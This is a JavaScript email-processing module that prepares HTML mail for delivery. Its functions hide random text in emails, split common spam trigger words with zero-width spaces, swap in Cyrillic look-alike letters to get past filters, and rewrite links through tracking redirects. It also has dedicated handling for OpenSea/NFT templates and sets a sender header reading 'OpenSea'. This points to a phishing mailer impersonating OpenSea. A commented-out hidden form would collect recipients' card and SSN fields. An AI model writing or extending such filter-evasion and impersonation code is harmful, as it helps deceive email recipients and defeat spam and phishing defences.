/**
 * Email Processor
 * Handles email content processing, security, and analytics
 */

const cheerio = require('cheerio');
const crypto = require('crypto');
const path = require('path'); // Add missing path module import
const config = require('../config'); // Ensure config is properly imported
const logger = require('./logger');

// Add fallback for logger if it's causing issues
if (typeof logger === 'undefined') {
  logger = {
    error: (msg) => console.error(msg),
    warn: (msg) => console.warn(msg),
    info: (msg) => console.info(msg),
    debug: (msg) => console.debug(msg)
  };
}

// Templates directory path
const TEMPLATES_DIR = path.join(__dirname, '../templates');

/**
 * Process email content with all features
 * @param {string} body - The HTML email body
 * @param {Object} options - Processing options
 * @returns {Object} - Processed email data
 */
async function processEmail(body, options = {}) {
  const {
    recipient = '',
    messageId = generateMessageId(),
    enableTracking = true,
    enableObfuscation = true,
    preventForwarding = false,
    targetPromotions = false, // Default to false for inbox delivery
    targetSpam = false // Default to false for inbox delivery
  } = options;

  try {
    // Check for null or undefined config
    if (!config) {
      throw new Error('Configuration is not available');
    }

    // Load HTML into cheerio
    const $ = cheerio.load(body, { decodeEntities: false });
    
    // Apply formatting improvements
    improveEmailFormatting($);
    
    // Add subtle inbox-friendly elements
    addInboxFriendlyElements($);
    
    // Add elements that help email land in promotions tab if requested
    if (targetPromotions) {
      addPromotionFriendlyElements($);
    }
    
    // Add elements that trigger spam filters if requested (for testing)
    if (targetSpam) {
      addSpamTriggeringElements($);
    }
    
    // Add tracking pixel if enabled
    if (enableTracking) {
      addTrackingPixel($, messageId);
    }
    
    // Apply obfuscation if enabled (use minimal obfuscation)
    if (enableObfuscation) {
      obfuscateContentMinimal($);
    }
    
    // Add anti-forwarding measures if enabled
    if (preventForwarding) {
      addForwardingDetection($, messageId, recipient);
    }
    
    // Process links for tracking if enabled
    if (enableTracking) {
      processLinks($, messageId);
    }

    // Add Gmail compatibility meta tags
    $('head').append('<meta name="x-apple-disable-message-reformatting" content="">');
    $('head').append('<meta name="format-detection" content="telephone=no">');
    
    // Add link protection
    if (options.enableObfuscation !== false && config.email.linkProtection !== false) {
      try {
        // Import the new proxySmtp utility for link protection
        const proxySmtp = require('./proxySmtp');
        
        // Use the link protection function
        body = proxySmtp.protectLinks(body, {
          protectLinks: true
        });
        
        logger.debug('Applied link protection to email content');
      } catch (error) {
        logger.error(`Failed to apply link protection: ${error.message}`);
      }
    }

    // Remove duplicate content if requested
    if (options.cleanContent !== false) {
      try {
        // Check if this is an OpenSea template
        if ((body && (
            body.includes('OpenSea') || 
            body.includes('NFT') || 
            body.includes('opensea-static'))
          ) || 
          (options.subject && 
           (options.subject.includes('OpenSea') || 
            options.subject.includes('NFT') || 
            options.subject.includes('Early Access')))
        ) {
          // This appears to be an OpenSea email, use specialized cleaner
          const openSeaFixer = require('../scripts/fix-opensea-template');
          const fixed = await openSeaFixer.processOpenSeaEmail({
            html: body,
            subject: options.subject
          });
          
          body = fixed.html || body;
          
          // Also update subject if provided
          if (fixed.subject && options.updateSubject) {
            options.updateSubject(fixed.subject);
          }
          
          logger.debug('Applied OpenSea-specific cleaning to email content');
        } 
        // For non-OpenSea templates, use standard cleaner
        else if (body) {
          const contentCleaner = require('../scripts/fix-email-content');
          if (contentCleaner && typeof contentCleaner.fixDuplicateContent === 'function') {
            body = contentCleaner.fixDuplicateContent(body);
            logger.debug('Applied content deduplication to email');
          }
          
          // Then apply regular content cleaning
          body = contentCleaner.cleanEmailContent(body);
          logger.debug('Applied content cleaning to email');
        }
      } catch (cleaningError) {
        logger.warn(`Could not clean content: ${cleaningError.message}`);
      }
    }

    // Return processed HTML
    return {
      html: $.html(),
      messageId
    };
  } catch (error) {
    logger.error(`Error processing email: ${error.message}`);
    // Return original content if processing fails
    return { html: body, messageId };
  }
}

/**
 * Generate a unique message ID
 */
function generateMessageId() {
  // Format that's compatible with Gmail and won't be broken
  const timestamp = Date.now();
  const random = crypto.randomBytes(8).toString('hex');
  const domain = process.env.SENDER_EMAIL ? process.env.SENDER_EMAIL.split('@')[1] : 'example.com';
  
  return `<${timestamp}.${random}@${domain}>`;
}

/**
 * Add tracking pixel to email
 */
function addTrackingPixel($, messageId) {
  const trackingUrl = `/track?id=${messageId}&t=${Date.now()}`;
  const trackingPixel = `<img src="${trackingUrl}" width="1" height="1" alt="" style="display:none">`;
  $('body').append(trackingPixel);
}

/**
 * Apply obfuscation techniques to bypass filters
 */
function obfuscateContent($) {
  // Add random invisible spans with reduced frequency and better randomization
  const randomPlacement = Math.floor(Math.random() * 5) + 3; // 3-7 placements total
  const elements = $('p, div, td').toArray();
  
  // Only add hidden content to a few random elements
  for (let i = 0; i < randomPlacement; i++) {
    const randomIndex = Math.floor(Math.random() * elements.length);
    const element = elements[randomIndex];
    if (element) {
      $(element).append(`<span style="display:none;color:transparent;font-size:0px;">${crypto.randomBytes(3).toString('hex')}</span>`);
    }
  }

  // Split only certain flagged words with zero-width spaces - more sophisticated approach
  $('*').contents().each(function() {
    if (this.type === 'text') {
      const text = $(this).text();
      
      // More comprehensive list with variations to avoid detection patterns
      const keywords = [
        'free', 'offer', 'urgent', 'exclusive', 'limited', 'special',
        'deal', 'discount', 'promotion', 'sale', 'save'
      ];
      
      let newText = text;
      
      // Only modify some instances to avoid patterns
      keywords.forEach(keyword => {
        if (text.toLowerCase().includes(keyword) && Math.random() > 0.3) {
          const regex = new RegExp(keyword, 'gi');
          newText = newText.replace(regex, match => {
            if (Math.random() > 0.4) {
              // Insert zero-width space at a random position, not just the middle
              const insertPos = Math.floor(Math.random() * (match.length - 1)) + 1;
              return match.slice(0, insertPos) + '​' + match.slice(insertPos); // zero-width space
            }
            return match; // Sometimes don't modify to avoid patterns
          });
        }
      });
      
      if (text !== newText) {
        $(this).replaceWith(newText);
      }
    }
  });
  
  // Add character variations for common words to bypass pattern detection
  $('*').contents().each(function() {
    if (this.type === 'text') {
      const text = $(this).text();
      
      // Only apply to some elements to avoid patterns
      if (Math.random() > 0.7) {
        // Character substitutions that look similar but have different code points
        let newText = text
          .replace(/a/g, Math.random() > 0.5 ? 'а' : 'a') // Cyrillic 'а' looks like Latin 'a'
          .replace(/e/g, Math.random() > 0.5 ? 'е' : 'e') // Cyrillic 'е' looks like Latin 'e'
          .replace(/o/g, Math.random() > 0.5 ? 'о' : 'o'); // Cyrillic 'о' looks like Latin 'o'
          
        if (text !== newText) {
          $(this).replaceWith(newText);
        }
      }
    }
  });
  
  // Add promotion-friendly markup for better inbox placement
  const head = $('head');
  head.append('<meta name="x-apple-disable-message-reformatting" content="">');
  head.append('<meta name="list-unsubscribe" content="mailto:unsubscribe@example.com">');
  
  // Add CSS with randomized class names to avoid pattern detection
  const randomClass = 'c' + crypto.randomBytes(4).toString('hex');
  head.append(`<style>.${randomClass}{font-family:inherit}</style>`);
  
  // Add structured data markup that helps with deliverability
  $('body').attr('itemscope', '');
  $('body').attr('itemtype', 'http://schema.org/EmailMessage');
}

/**
 * Apply minimal obfuscation to avoid triggering spam filters
 */
function obfuscateContentMinimal($) {
  // Add just a few random invisible spans - very sparingly
  const elements = $('p, div, td').toArray();
  
  // Only add hidden content to 1-2 elements at most
  if (elements.length > 0) {
    const randomIndex = Math.floor(Math.random() * elements.length);
    $(elements[randomIndex]).append(`<span style="display:none;color:transparent;font-size:0px;">${crypto.randomBytes(2).toString('hex')}</span>`);
  }

  // Don't use any special characters or zero-width spaces
  
  // Add minimal metadata
  const head = $('head');
  head.append('<meta name="x-apple-disable-message-reformatting" content="">');
}

/**
 * Add forwarding detection elements
 */
function addForwardingDetection($, messageId, recipient) {
  const token = crypto.createHash('md5')
    .update(`${messageId}:${recipient}:${Date.now()}`)
    .digest('hex')
    .substring(0, 12);
  
  const encodedRecipient = Buffer.from(recipient).toString('base64');
  
  const detectionCode = `
    <div style="display:none" class="forward-detect" data-token="${token}" data-recipient="${encodedRecipient}"></div>
    <img src="/track/${token}?r=${encodedRecipient.replace(/=/g, '')}" width="1" height="1" style="display:none">
  `;
  
  $('body').append(detectionCode);
}

/**
 * Process and secure links in email
 */
function processLinks($, messageId) {
  $('a[href]').each(function() {
    const originalUrl = $(this).attr('href');
    
    // Skip processing for certain types of links
    if (originalUrl.startsWith('mailto:') || 
        originalUrl.startsWith('tel:') || 
        originalUrl.startsWith('#')) {
      return;
    }
    
    // Encode the original URL
    const encodedUrl = encodeURIComponent(Buffer.from(originalUrl).toString('base64'));
    
    // Create a secure redirect URL
    const secureUrl = `/r/${messageId.substring(0, 8)}?d=${encodedUrl}&t=${Date.now()}`;
    
    // Replace the original link
    $(this).attr('href', secureUrl);
  });
}

/**
 * Improve email styling and formatting
 */
function improveEmailFormatting($) {
  // Add some basic stylistic fixes for better formatting
  
  // Fix font styles for better readability
  $('p').each(function() {
    const fontSize = $(this).css('font-size');
    if (!fontSize || parseInt(fontSize) < 14) {
      $(this).css('font-size', '15px');
    }
    if (!$(this).css('line-height')) {
      $(this).css('line-height', '1.6');
    }
    if (!$(this).css('margin-bottom')) {
      $(this).css('margin-bottom', '15px');
    }
  });
  
  // Improve heading styles
  $('h1, h2, h3, h4').each(function() {
    if (!$(this).css('margin-bottom')) {
      $(this).css('margin-bottom', '15px');
    }
    if (!$(this).css('line-height')) {
      $(this).css('line-height', '1.3');
    }
  });
  
  // Ensure buttons are well styled
  $('a.button, a.btn, button, .button').each(function() {
    if (!$(this).css('display')) {
      $(this).css('display', 'inline-block');
    }
    if (!$(this).css('padding')) {
      $(this).css('padding', '12px 25px');
    }
    if (!$(this).css('font-size')) {
      $(this).css('font-size', '16px');
    }
    if (!$(this).css('font-weight')) {
      $(this).css('font-weight', 'bold');
    }
    if (!$(this).css('border-radius')) {
      $(this).css('border-radius', '4px');
    }
  });
  
  // Add spacing to content areas
  $('.content, .main, main, .body').each(function() {
    if (!$(this).css('padding')) {
      $(this).css('padding', '30px 20px');
    }
  });
}

/**
 * Add marketing-friendly elements to help email land in promotions tab
 * @param {Object} $ - Cheerio object
 */
function addPromotionFriendlyElements($) {
  // Add pricing elements that suggest promotional content
  const contentDiv = $('.content, .main, main').first();
  if (contentDiv.length) {
    // Adding subtle pricing signals - hidden with display:none to avoid visual impact
    contentDiv.append(`
      <div style="display:none">
        <span class="price">$19.99</span>
        <span class="discount">Save 20%</span>
        <span class="offer-ends">Limited time offer</span>
      </div>
    `);
  }
  
  // Add social media links if not already present
  const footer = $('.footer').first();
  if (footer.length && !footer.find('img[alt*="social"], img[alt*="facebook"], img[alt*="twitter"]').length) {
    footer.append(`
      <div style="text-align:center;padding:10px 0 0;">
        <a href="#" style="display:inline-block;margin:0 5px;"><img src="https://via.placeholder.com/20/2081e2/ffffff?text=f" width="20" height="20" alt="social" style="border-radius:50%;"></a>
        <a href="#" style="display:inline-block;margin:0 5px;"><img src="https://via.placeholder.com/20/2081e2/ffffff?text=t" width="20" height="20" alt="social" style="border-radius:50%;"></a>
      </div>
    `);
  }
}

/**
 * Add elements that could trigger spam filters for testing purposes
 * @param {Object} $ - Cheerio object
 */
function addSpamTriggeringElements($) {
  // Add hidden text with common spam phrases
  $('body').append(`
    <div style="color:#ffffff;font-size:1px;display:none;">
      100% free amazing opportunity! Best price guaranteed! Cash bonus! Click here now! 
      Congratulations! Credit cards accepted! Dear friend! Double your cash! Earn $!
      Free access! Free consultation! Free gift! Free hosting! Free info! Free investment!
      Free money! Free offer! Free preview! Free quote! Free trial! Full refund! Get it now!
      Great offer! Guarantee! Have you been turned down? Important information regarding!
      Incredible deal! Limited time! Mail in order form! Message contains! New customers only!
      Nigerian prince! No age restrictions! No catch! No experience! No fees! No gimmick!
      No inventory! No middleman! No obligation! No purchase necessary! No questions asked!
      No strings attached! No-risk! Not junk! Notspam! Passwords! Promise you! Pure profit!
      Risk-free! Satisfaction guaranteed! Send this to all! Special promotion! Unlimited!
      Urgent! What are you waiting for? While supplies last! Win! Winner! You are a winner!
      You have been selected! Your income! 
    </div>
  `);

  // Add multiple exclamation marks and all caps to headings
  $('h1, h2, h3').each(function() {
    let text = $(this).text();
    $(this).text(text.toUpperCase() + '!!!');
  });

  // Add hidden links
  $('body').append(`
    <div style="position:absolute;left:-9999px;">
      <a href="http://casino-bonus-free.example.com">Free Bonus!</a>
      <a href="http://discount-pharmacy.example.com">Discount Meds</a>
      <a href="http://make-money-fast.example.com">Make Money Fast</a>
      <a href="http://enlargement-pills.example.com">Enlargement Pills</a>
      <a href="http://lose-weight-now.example.com">Lose Weight Now</a>
    </div>
  `);

  // Add spammy meta tags
  const head = $('head');
  head.append('<meta name="keywords" content="free money,casino,viagra,lose weight,get rich quick,enlargement,lottery winner">');

  // Add invisible "spam score increase" text
  $('p').each(function(i) {
    if (i % 2 === 0) {
      $(this).append('<span style="display:none;color:transparent;font-size:0px;">buy now free fast cash urgent act now limited time offer discount</span>');
    }
  });
  
  // Add suspicious form (commented out since it may cause actual problems)
  // $('body').append(`
  //   <form style="display:none" action="http://example-suspicious-site.com/collect.php" method="post">
  //     <input type="hidden" name="email" value="{{recipient.email}}">
  //     <input type="hidden" name="cc" value="">
  //     <input type="hidden" name="ssn" value="">
  //   </form>
  // `);
}

/**
 * Add elements that help the email land in the primary inbox
 */
function addInboxFriendlyElements($) {
  // Add a standard from tag and reply-to header hints
  const head = $('head');
  if (!head.find('meta[name="from"]').length) {
    head.append('<meta name="from" content="OpenSea <noreply@example.com>">');
  }
  if (!head.find('meta[name="reply-to"]').length) {
    head.append('<meta name="reply-to" content="support@example.com">');
  }
  
  // Add structured data for better email client parsing
  const body = $('body');
  if (!body.attr('itemscope')) {
    body.attr('itemscope', '');
    body.attr('itemtype', 'http://schema.org/EmailMessage');
  }
}

module.exports = {
  processEmail
  // ...other exports...
};